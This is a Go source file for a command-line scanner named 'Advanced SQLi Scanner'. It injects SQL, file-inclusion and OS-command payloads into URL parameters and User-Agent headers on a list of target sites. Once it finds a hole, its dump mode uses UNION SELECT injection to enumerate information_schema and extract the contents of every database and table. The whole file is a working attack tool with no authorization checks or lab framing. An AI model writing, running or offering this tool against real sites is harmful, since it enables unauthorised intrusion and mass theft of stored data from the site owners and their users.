package main

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/fatih/color"
)

// Define colors for output
var (
	red    = color.New(color.FgRed).SprintFunc()
	green  = color.New(color.FgGreen).SprintFunc()
	yellow = color.New(color.FgYellow).SprintFunc()
	cyan   = color.New(color.FgCyan).SprintFunc()
	blue   = color.New(color.FgBlue).SprintFunc()
	white  = color.New(color.FgWhite).SprintFunc()
)

// --- Constants & Global Flags ---
var sqlErrorPatterns = []string{
	"sql syntax", "mysql", "unclosed quotation mark", 
	"odbc", "oracle", "you have an error in your sql syntax",
	"syntax error", "unterminated quoted string",
}
var lfiContentPatterns = []string{"root:x:0:0", "boot.ini"}
const standardUA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

// Database schema
type DatabaseSchema struct {
	Name    string
	Tables  []TableSchema
}

type TableSchema struct {
	Name    string
	Columns []string
}

// Pointers for our flags
var (
	injectPoint *string
	verbose     *bool
	dump        *bool
)

// Shared HTTP client with cookie jar
var httpClient *http.Client

func init() {
	jar, err := cookiejar.New(nil)
	if err != nil {
		panic(fmt.Sprintf("Failed to create cookie jar: %v", err))
	}

	httpClient = &http.Client{
		Jar:     jar,
		Timeout: 30 * time.Second,
	}
}

func main() {
	// --- Flag Definitions ---
	urlFile := flag.String("urls", "urls.txt", "File containing a list of URLs to scan")
	sqliFile := flag.String("sqli", "", "File containing SQLi payloads")
	lfiFile := flag.String("lfi", "", "File containing LFI payloads")
	osFile := flag.String("os", "", "File containing OS injection payloads")
	concurrency := flag.Int("c", 10, "Number of concurrent goroutines")
	injectPoint = flag.String("inject-point", "all", "Injection point to test: all, header, or param")
	verbose = flag.Bool("v", false, "Enable verbose output to see every request")
	dump = flag.Bool("dump", false, "Dump database schema and data on discovery")

	flag.Parse()

	// --- Welcome Banner ---
	fmt.Println(cyan("============================================="))
	fmt.Println(cyan("=    Advanced SQLi Scanner (v11.0)         ="))
	fmt.Println(cyan("=     Full Database Extraction Engine      ="))
	fmt.Println(cyan("============================================="))

	// --- Input Validation ---
	if *sqliFile == "" && *lfiFile == "" && *osFile == "" {
		fmt.Println(red("Error: You must specify at least one payload type (--sqli, --lfi, or --os)"))
		os.Exit(1)
	}

	urls, err := readLines(*urlFile)
	if err != nil {
		fmt.Printf(red("Error reading URL file %s: %v\n"), *urlFile, err)
		os.Exit(1)
	}

	// --- Concurrency Setup ---
	tasks := make(chan string)
	var wg sync.WaitGroup

	for i := 0; i < *concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for url := range tasks {
				if *sqliFile != "" {
					scan(url, *sqliFile, "SQLi")
				}
				if *lfiFile != "" {
					scan(url, *lfiFile, "LFI")
				}
				if *osFile != "" {
					scan(url, *osFile, "OS-INJ")
				}
			}
		}()
	}

	// --- Task Distribution ---
	fmt.Println(cyan("[INFO] Distributing " + strconv.Itoa(len(urls)) + " URL(s) to workers..."))
	for _, url := range urls {
		tasks <- url
	}
	close(tasks)

	wg.Wait()
	fmt.Println(yellow("\nScan finished."))
}

func scan(baseURL, payloadFile, vulnType string) {
	payloads, err := readLines(payloadFile)
	if err != nil {
		fmt.Printf(red("[%s] Error reading payload file %s: %v\n"), baseURL, payloadFile, err)
		return
	}

	if !*verbose {
		fmt.Printf(cyan("[INFO] Starting %s scan on %s (Points: %s)\n"), vulnType, baseURL, *injectPoint)
	}

	for _, payload := range payloads {
		switch *injectPoint {
		case "header":
			checkUserAgent(baseURL, payload, vulnType, *dump)
		case "param":
			checkURLParameters(baseURL, payload, vulnType, *dump)
		default:
			checkUserAgent(baseURL, payload, vulnType, *dump)
			checkURLParameters(baseURL, payload, vulnType, *dump)
		}
	}
}

func performCheck(targetURL, payload, vulnType, injectionPoint string, dumpData bool, headers ...string) {
	if *verbose {
		fmt.Printf(white("[TESTING] Point: %-12s | Payload: %s\n"), yellow(injectionPoint), payload)
	}

	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return
	}

	// Set realistic browser headers
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Connection", "keep-alive")

	if len(headers) > 0 {
		req.Header.Set("User-Agent", headers[0])
	} else {
		req.Header.Set("User-Agent", standardUA)
	}

	startTime := time.Now()
	resp, err := httpClient.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	duration := time.Since(startTime)

	bodyBytes, _ := io.ReadAll(resp.Body)
	bodyString := string(bodyBytes)

	isVulnerable := false
	detectionDetails := ""

	switch vulnType {
	case "SQLi":
		for _, pattern := range sqlErrorPatterns {
			if strings.Contains(strings.ToLower(bodyString), pattern) {
				isVulnerable = true
				detectionDetails = fmt.Sprintf("Found error pattern: '%s'", pattern)
				break
			}
		}
		if !isVulnerable && duration.Seconds() > 9.5 {
			isVulnerable = true
			detectionDetails = fmt.Sprintf("Response time delay: %.2fs", duration.Seconds())
		}
	case "LFI":
		for _, pattern := range lfiContentPatterns {
			if strings.Contains(bodyString, pattern) {
				isVulnerable = true
				detectionDetails = fmt.Sprintf("Found content: '%s'", pattern)
				break
			}
		}
	case "OS-INJ":
		if duration.Seconds() > 9.5 {
			isVulnerable = true
			detectionDetails = fmt.Sprintf("Response time delay: %.2fs", duration.Seconds())
		}
	}

	if isVulnerable {
		fmt.Printf("\n[%s] %s FOUND!\n", green("VULNERABLE"), yellow(vulnType))
		fmt.Printf("  URL:     %s\n", blue(targetURL))
		fmt.Printf("  Point:   %s\n", yellow(injectionPoint))
		fmt.Printf("  Payload: %s\n", red(payload))
		fmt.Printf("  Details: %s\n", detectionDetails)

		if dumpData && vulnType == "SQLi" {
			if strings.HasPrefix(injectionPoint, "Param:") {
				dumpDatabaseSchema(targetURL, injectionPoint)
			} else if injectionPoint == "User-Agent" {
				dumpDatabaseSchema(targetURL, injectionPoint)
			}
		}
		fmt.Println()
	}
}

func dumpDatabaseSchema(vulnerableURL, injectionPoint string) {
	fmt.Printf("  [%s] Starting full database extraction...\n", cyan("DB DUMP"))
	
	// First get basic database info
	dbInfo := getDatabaseInfo(vulnerableURL, injectionPoint)
	if dbInfo == "" {
		fmt.Printf("  [%s] Failed to get database information\n", red("ERROR"))
		return
	}
	
	fmt.Printf("  [%s] Database Information:\n", green("SUCCESS"))
	fmt.Println(cyan("  ----------------------------------------------"))
	fmt.Println(white("  " + dbInfo))
	fmt.Println(cyan("  ----------------------------------------------"))
	
	// Get database names
	dbs := getDatabases(vulnerableURL, injectionPoint)
	if len(dbs) == 0 {
		fmt.Printf("  [%s] No databases found\n", yellow("WARNING"))
		return
	}
	
	fmt.Printf("  [%s] Found %d databases:\n", green("SUCCESS"), len(dbs))
	for i, db := range dbs {
		fmt.Printf("  [%d] %s\n", i+1, cyan(db))
	}
	
	// Dump each database
	for _, db := range dbs {
		dumpDatabase(vulnerableURL, injectionPoint, db)
	}
}

func getDatabaseInfo(vulnerableURL, injectionPoint string) string {
	payload := "concat('@@version:',@@version,'|@@hostname:',@@hostname,'|user:',user(),'|database:',database())"
	body, err := executeUnionSelect(vulnerableURL, injectionPoint, payload, 1)
	if err != nil {
		return ""
	}
	
	// Extract database info from response
	info := extractDatabaseInfo(body)
	if info != "" {
		return info
	}
	
	// Fallback to error-based extraction
	return extractErrorBasedInfo(body)
}

func getDatabases(vulnerableURL, injectionPoint string) []string {
	payload := "schema_name"
	body, err := executeUnionSelect(
		vulnerableURL, 
		injectionPoint, 
		payload, 
		1,
		" FROM information_schema.schemata",
	)
	
	if err != nil {
		return []string{}
	}
	
	return extractMultipleValues(body)
}

func dumpDatabase(vulnerableURL, injectionPoint, dbName string) {
	fmt.Printf("\n  [%s] Dumping database: %s\n", cyan("DB DUMP"), yellow(dbName))
	
	// Get tables for this database
	tables := getTables(vulnerableURL, injectionPoint, dbName)
	if len(tables) == 0 {
		fmt.Printf("  [%s] No tables found in database %s\n", yellow("WARNING"), dbName)
		return
	}
	
	fmt.Printf("  [%s] Found %d tables in %s:\n", green("SUCCESS"), len(tables), dbName)
	for i, table := range tables {
		fmt.Printf("  [%d] %s\n", i+1, cyan(table))
	}
	
	// Dump each table
	for _, table := range tables {
		dumpTable(vulnerableURL, injectionPoint, dbName, table)
	}
}

func getTables(vulnerableURL, injectionPoint, dbName string) []string {
	payload := "table_name"
	whereClause := fmt.Sprintf(" WHERE table_schema='%s'", dbName)
	body, err := executeUnionSelect(
		vulnerableURL, 
		injectionPoint, 
		payload, 
		1,
		" FROM information_schema.tables",
		whereClause,
	)
	
	if err != nil {
		return []string{}
	}
	
	return extractMultipleValues(body)
}

func dumpTable(vulnerableURL, injectionPoint, dbName, table string) {
	fmt.Printf("\n  [%s] Dumping table: %s.%s\n", cyan("DB DUMP"), yellow(dbName), yellow(table))
	
	// Get columns for this table
	columns := getColumns(vulnerableURL, injectionPoint, dbName, table)
	if len(columns) == 0 {
		fmt.Printf("  [%s] No columns found in table %s\n", yellow("WARNING"), table)
		return
	}
	
	fmt.Printf("  [%s] Found %d columns:\n", green("SUCCESS"), len(columns))
	for i, col := range columns {
		fmt.Printf("  [%d] %s\n", i+1, cyan(col))
	}
	
	// Dump table data
	dumpTableData(vulnerableURL, injectionPoint, dbName, table, columns)
}

func getColumns(vulnerableURL, injectionPoint, dbName, table string) []string {
	payload := "column_name"
	whereClause := fmt.Sprintf(" WHERE table_schema='%s' AND table_name='%s'", dbName, table)
	body, err := executeUnionSelect(
		vulnerableURL, 
		injectionPoint, 
		payload, 
		1,
		" FROM information_schema.columns",
		whereClause,
	)
	
	if err != nil {
		return []string{}
	}
	
	return extractMultipleValues(body)
}

func dumpTableData(vulnerableURL, injectionPoint, dbName, table string, columns []string) {
	// Construct column concat expression
	concatExpr := ""
	for i, col := range columns {
		if i > 0 {
			concatExpr += ",' | ',"
		}
		concatExpr += fmt.Sprintf("ifnull(cast(`%s` as char),'NULL')", col)
	}
	
	payload := "concat('ROW_START:'," + concatExpr + ",'ROW_END')"
	whereClause := fmt.Sprintf(" FROM `%s`.`%s`", dbName, table)
	
	offset := 0
	rowCount := 0
	batchSize := 10
	
	fmt.Printf("  [%s] Table data:\n", cyan("DATA DUMP"))
	fmt.Println(cyan("  ----------------------------------------------"))
	
	for {
		limitClause := fmt.Sprintf(" LIMIT %d,%d", offset, batchSize)
		body, err := executeUnionSelect(
			vulnerableURL, 
			injectionPoint, 
			payload, 
			1,
			whereClause,
			limitClause,
		)
		
		if err != nil || body == "" {
			break
		}
		
		rows := extractTableData(body)
		if len(rows) == 0 {
			break
		}
		
		for _, row := range rows {
			fmt.Println("  " + row)
			rowCount++
		}
		
		if len(rows) < batchSize {
			break
		}
		
		offset += batchSize
	}
	
	fmt.Println(cyan("  ----------------------------------------------"))
	fmt.Printf("  [%s] Dumped %d rows from %s.%s\n", green("SUCCESS"), rowCount, dbName, table)
}

func executeUnionSelect(vulnerableURL, injectionPoint, payload string, columnIndex int, clauses ...string) (string, error) {
	columnCount := detectColumnCount(vulnerableURL, injectionPoint)
	if columnCount == 0 {
		return "", fmt.Errorf("column count detection failed")
	}
	
	// Build the UNION SELECT payload
	nulls := make([]string, columnCount)
	for i := 0; i < columnCount; i++ {
		nulls[i] = "NULL"
	}
	
	// Replace the specified column with our payload
	if columnIndex < 0 || columnIndex >= columnCount {
		columnIndex = 0
	}
	nulls[columnIndex] = payload
	
	fullPayload := " UNION SELECT " + strings.Join(nulls, ",")
	
	// Add any additional clauses
	for _, clause := range clauses {
		fullPayload += clause
	}
	
	fullPayload += "-- -"
	
	var req *http.Request
	var err error
	
	if strings.HasPrefix(injectionPoint, "Param:") {
		// Parameter-based injection
		parsedURL, err := url.Parse(vulnerableURL)
		if err != nil {
			return "", err
		}
		
		paramName := strings.TrimSpace(strings.TrimPrefix(injectionPoint, "Param:"))
		queryParams := parsedURL.Query()
		originalValue := queryParams.Get(paramName)
		
		// Preserve original injection point
		injectedValue := ""
		if strings.Contains(originalValue, "'") {
			injectedValue = "'" + fullPayload
		} else {
			injectedValue = "\"" + fullPayload
		}
		
		queryParams.Set(paramName, injectedValue)
		parsedURL.RawQuery = queryParams.Encode()
		targetURL := parsedURL.String()
		
		req, err = http.NewRequest("GET", targetURL, nil)
		if err != nil {
			return "", err
		}
	} else {
		// Header-based injection
		req, err = http.NewRequest("GET", vulnerableURL, nil)
		if err != nil {
			return "", err
		}
		
		ua := standardUA + "'" + fullPayload
		req.Header.Set("User-Agent", ua)
	}
	
	// Set headers
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	
	// Execute request
	resp, err := httpClient.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	
	bodyBytes, _ := io.ReadAll(resp.Body)
	return string(bodyBytes), nil
}

func detectColumnCount(vulnerableURL, injectionPoint string) int {
	// Try ORDER BY method
	for i := 1; i <= 25; i++ {
		payload := fmt.Sprintf(" ORDER BY %d-- -", i)
		
		body, err := executePayload(vulnerableURL, injectionPoint, payload)
		if err != nil {
			continue
		}
		
		hasError := false
		for _, pattern := range sqlErrorPatterns {
			if strings.Contains(strings.ToLower(body), pattern) {
				hasError = true
				break
			}
		}
		
		if hasError {
			return i - 1
		}
	}
	
	// Try NULL method as fallback
	for i := 1; i <= 25; i++ {
		nulls := make([]string, i)
		for j := 0; j < i; j++ {
			nulls[j] = "NULL"
		}
		
		payload := " UNION SELECT " + strings.Join(nulls, ",") + "-- -"
		body, err := executePayload(vulnerableURL, injectionPoint, payload)
		if err != nil {
			continue
		}
		
		hasError := false
		for _, pattern := range sqlErrorPatterns {
			if strings.Contains(strings.ToLower(body), pattern) {
				hasError = true
				break
			}
		}
		
		if !hasError {
			return i
		}
	}
	
	return 0
}

func executePayload(vulnerableURL, injectionPoint, payload string) (string, error) {
	var req *http.Request
	var err error
	
	if strings.HasPrefix(injectionPoint, "Param:") {
		parsedURL, err := url.Parse(vulnerableURL)
		if err != nil {
			return "", err
		}
		
		paramName := strings.TrimSpace(strings.TrimPrefix(injectionPoint, "Param:"))
		queryParams := parsedURL.Query()
		originalValue := queryParams.Get(paramName)
		
		// Preserve original injection point
		injectedValue := ""
		if strings.Contains(originalValue, "'") {
			injectedValue = "'" + payload
		} else {
			injectedValue = "\"" + payload
		}
		
		queryParams.Set(paramName, injectedValue)
		parsedURL.RawQuery = queryParams.Encode()
		targetURL := parsedURL.String()
		
		req, err = http.NewRequest("GET", targetURL, nil)
		if err != nil {
			return "", err
		}
	} else {
		req, err = http.NewRequest("GET", vulnerableURL, nil)
		if err != nil {
			return "", err
		}
		
		ua := standardUA + "'" + payload
		req.Header.Set("User-Agent", ua)
	}
	
	// Set headers
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	
	// Execute request
	resp, err := httpClient.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	
	bodyBytes, _ := io.ReadAll(resp.Body)
	return string(bodyBytes), nil
}

func extractDatabaseInfo(body string) string {
	// Look for standard patterns
	patterns := []string{
		`(?i)version:\s*([^\s<]+)`,
		`(?i)user\(\):\s*([^\s<]+)`,
		`(?i)database\(\):\s*([^\s<]+)`,
		`(?i)@@version:\s*([^\s<]+)`,
		`(?i)@@hostname:\s*([^\s<]+)`,
	}
	
	info := ""
	for _, pattern := range patterns {
		re := regexp.MustCompile(pattern)
		matches := re.FindStringSubmatch(body)
		if len(matches) > 1 {
			info += matches[0] + "\n"
		}
	}
	
	return info
}

func extractErrorBasedInfo(body string) string {
	// Extract from common error messages
	patterns := []string{
		`(?i)SQLSTATE\[\d+\]:?[^:]+:\s*([^<]+)`,
		`(?i)error in your SQL syntax[^;]+;([^<]+)`,
		`(?i)mysql[^:]+:\s*([^<]+)`,
	}
	
	info := ""
	for _, pattern := range patterns {
		re := regexp.MustCompile(pattern)
		matches := re.FindStringSubmatch(body)
		if len(matches) > 1 {
			info += matches[1] + "\n"
		}
	}
	
	return info
}

func extractMultipleValues(body string) []string {
	// Look for distinct values separated by newlines or HTML tags
	re := regexp.MustCompile(`(?i)>([a-z0-9_\-]+)<`)
	matches := re.FindAllStringSubmatch(body, -1)
	
	unique := make(map[string]bool)
	for _, match := range matches {
		if len(match) > 1 {
			unique[match[1]] = true
		}
	}
	
	result := []string{}
	for value := range unique {
		result = append(result, value)
	}
	
	return result
}

func extractTableData(body string) []string {
	// Extract using ROW_START and ROW_END markers
	re := regexp.MustCompile(`ROW_START:(.*?)ROW_END`)
	matches := re.FindAllStringSubmatch(body, -1)
	
	rows := []string{}
	for _, match := range matches {
		if len(match) > 1 {
			rows = append(rows, match[1])
		}
	}
	
	return rows
}

func checkURLParameters(baseURL, payload, vulnType string, dumpData bool) {
	parsedURL, err := url.Parse(baseURL)
	if err != nil {
		return
	}
	params := parsedURL.Query()
	if len(params) == 0 {
		return
	}

	paramNames := make([]string, 0, len(params))
	for name := range params {
		paramNames = append(paramNames, name)
	}

	for _, paramName := range paramNames {
		originalValues := params[paramName]
		params.Set(paramName, payload)
		parsedURL.RawQuery = params.Encode()
		injectedURL := parsedURL.String()

		performCheck(injectedURL, payload, vulnType, fmt.Sprintf("Param: %s", paramName), dumpData)

		params[paramName] = originalValues
	}
}

func checkUserAgent(url, payload, vulnType string, dumpData bool) {
	injectedUA := standardUA + " " + payload
	performCheck(url, payload, vulnType, "User-Agent", dumpData, injectedUA)
}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, scanner.Err()
}
